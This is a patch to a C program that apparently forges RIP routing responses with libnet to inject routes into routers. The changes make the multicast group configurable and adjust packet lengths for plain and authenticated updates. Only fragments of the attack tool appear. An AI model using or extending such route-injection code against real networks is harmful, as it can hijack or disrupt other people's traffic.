@@ -142,6 +142,7 @@ init_all ()
   localaddr = libnet_get_ipaddr4 ((libnet_t *) dev);
   routes[3][0] = htonl (1);
   w = 1;
+  strncpy(rip_group, "224.0.0.9", 9);
 }
 
 void
@@ -155,7 +156,7 @@ send_fake_rip_response ()
   char errbuf[LIBNET_ERRBUF_SIZE];
   u_char buffer[504];
   int i;
-
+  
   bzero (buffer, 504);
 
   pack = (struct rip *) (buffer);
@@ -180,7 +181,7 @@ send_fake_rip_response ()
   udp =
     libnet_build_udp (RIP_PORT, RIP_PORT,
 		      LIBNET_UDP_H + sizeof (struct rip) +
-		      sizeof (struct rip_message) * w + 1, 0, buffer,
+		      sizeof (struct rip_message) * w , 0, buffer,
 		      sizeof (struct rip) + sizeof (struct rip_message) * w,
 		      l, 0);
 
@@ -188,7 +189,7 @@ send_fake_rip_response ()
     libnet_build_ipv4 (LIBNET_IPV4_H + LIBNET_UDP_H + sizeof (struct rip) +
 		       sizeof (struct rip_message) * w, 0,
 		       3000 + (rand () % 100), 0, 64, IPPROTO_UDP, 0,
-		       localaddr, inet_addr (RIP_GROUP), NULL, 0, l, 0);
+		       localaddr, inet_addr (rip_group), NULL, 0, l, 0);
 
   if (libnet_toggle_checksum (l, udp, 1) < 0)
     fatal ("pippo: %s\n\n", libnet_geterror (l));
@@ -229,7 +230,7 @@ check_injection ()
     }
 
   peer.sin_family = AF_INET;
-  peer.sin_addr.s_addr = inet_addr (RIP_GROUP);
+  peer.sin_addr.s_addr = inet_addr (rip_group);
   peer.sin_port = htons (RIP_PORT);
 
   if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
@@ -519,17 +520,17 @@ auth_pass ()
 			  sizeof (struct rip_message) * w, 0, buffer,
 			  sizeof (struct rip) +
 			  sizeof (struct authentication) +
-			  sizeof (struct rip_message) * w + 1, l, 0);
+			  sizeof (struct rip_message) * w , l, 0);
 
   ip = libnet_build_ipv4 (LIBNET_IPV4_H + LIBNET_UDP_H + sizeof (struct rip) +
 			  sizeof (struct authentication) +
-			  sizeof (struct rip_message) * w + 1,
+			  sizeof (struct rip_message) * w ,
 			  0,
 			  3000 + (rand () % 100),
 			  0,
 			  64,
 			  IPPROTO_UDP,
-			  0, localaddr, inet_addr (RIP_GROUP), NULL, 0, l, 0);
+			  0, localaddr, inet_addr (rip_group), NULL, 0, l, 0);
 
   if (libnet_toggle_checksum (l, udp, 1) < 0)
     fatal ("error: %s\n\n", libnet_geterror (l));
@@ -580,7 +581,7 @@ check_injection_crypt ()
     }
 
   peer.sin_family = AF_INET;
-  peer.sin_addr.s_addr = inet_addr (RIP_GROUP);
+  peer.sin_addr.s_addr = inet_addr (rip_group);
   peer.sin_port = htons (RIP_PORT);
 
   if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
